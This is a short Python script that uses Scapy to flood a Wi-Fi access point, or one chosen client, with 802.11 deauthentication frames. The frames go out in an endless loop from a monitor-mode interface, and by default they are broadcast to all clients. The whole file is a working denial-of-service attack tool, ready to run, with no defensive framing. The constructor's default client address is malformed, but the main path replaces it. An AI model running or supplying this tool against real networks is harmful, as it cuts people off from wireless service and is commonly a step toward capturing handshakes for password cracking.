#!/usr/bin/python
import sys
import time

from scapy.all import sendp, RadioTap, Dot11, Dot11Deauth


class Deauth(object):

    def __init__(self, bssid, client="ff:ff:ff:ff:ff", dev="mon0", timeout=1):
        self.bssid = bssid
        self.client = client
        self.dev = dev
        self.timeout = timeout

    def deauth(self):

        pkt = RadioTap() / \
            Dot11(
                subtype=0xc,
                addr1=self.client, addr2=self.bssid, addr3=self.bssid
            ) / Dot11Deauth(reason=3)
        try:
            print "start deauth on : %s " % self.dev
            while True:
                print "Sending deauth to " + self.client
                sendp(pkt, iface=self.dev)
                time.sleep(self.timeout)
        except KeyboardInterrupt:
            print "End Deauth %s.." % self.client

if __name__ == "__main__":
    iface = "mon0"
    timeout = 1

    if len(sys.argv) < 2:
        print sys.argv[0] + " <bssid> [client]"
        sys.exit(0)
    else:
        bssid = sys.argv[1]

    if len(sys.argv) == 3:
        dest = sys.argv[2]
    else:
        dest = "ff:ff:ff:ff:ff:ff"

    deauth = Deauth(bssid, dest)
    deauth.deauth()
